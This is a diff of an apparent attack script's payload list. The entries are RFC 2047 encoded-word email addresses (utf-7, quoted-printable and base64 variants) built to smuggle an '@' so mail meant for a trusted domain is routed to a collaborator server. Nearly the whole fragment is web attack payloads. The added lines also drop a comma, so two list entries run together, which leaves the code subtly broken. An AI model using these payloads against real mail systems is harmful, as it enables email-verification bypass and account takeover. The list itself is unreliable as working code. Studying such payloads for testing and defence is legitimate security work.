@@ -13,8 +13,10 @@ payloads = ["=?x?q?$collab1=40$collabServer=3e=00?=foo@$validServer","=?x?q?$col
             "=?x?q?$collab1=40$collabServer=3e=17?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=19?=foo@$validServer", "=?x?q?$collab1=40$collabServer=3e=1a?=foo@$validServer",
             "=?x?q?$collab1=40$collabServer=3e=1b?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=1c?=foo@$validServer", "=?x?q?$collab1=40$collabServer=3e=1d?=foo@$validServer",
             "=?x?q?$collab1=40$collabServer=3e=1f?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=20?=foo@$validServer", "=?x?q?$collab1=40$collabServer=2c?=x@$validServer",
-            "=?utf7?q?$collab1&AEA-$collabServer&ACw-?=x@$validServer","=?utf7?q?$collab1&AEA-$collabServer&ACw=/xyz!-?=x@$validServer",
-            "=?utf7?q?$collab1=26AEA-$collabServer=26ACw-?=x@$validServer","$collab1=?utf7?b?JkFFQS0?=$collabServer=?utf7?b?JkFDdy0?=x@$validServer","$collab1=?x?b?QA==?=$collabServer=?x?b?LA==?=x@$validServer"
+            "=?utf-7?q?$collab1&AEA-$collabServer&ACw-?=foo@$validServer","=?utf-7?q?$collab1&AEA-$collabServer&ACw=/xyz!-?=foo@$validServer",
+            "=?utf-7?q?$collab1=26AEA-$collabServer=26ACw-?=foo@$validServer","$collab1=?utf-7?b?JkFFQS0?=$collabServer=?utf-7?b?JkFDdy0?=foo@$validServer","$collab1=?x?b?QA==?=$collabServer=?x?b?LA==?=foo@$validServer"
+            "=?utf-7?q?$collab1&AEA-$collabServer&ACA-?=foo@$validServer","=?utf-7?q?$collab1&AEA-$collabServer&ACA=/xyz!-?=foo@$validServer",
+            "=?utf-7?q?$collab1=26AEA-$collabServer=26ACA-?=foo@$validServer","$collab1=?utf-7?b?JkFFQS0?=$collabServer=?utf-7?b?JkFDdy0?=foo@$validServer","$collab1=?x?b?QA==?=$collabServer=?x?b?LA==?=foo@$validServer"
            ]
            
 invalidServer = "blah.blah"
